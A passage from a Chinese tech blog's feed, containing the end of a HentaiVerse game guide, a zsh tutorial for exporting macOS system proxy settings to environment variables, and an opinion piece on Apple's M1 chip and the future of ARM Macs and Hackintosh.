而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" 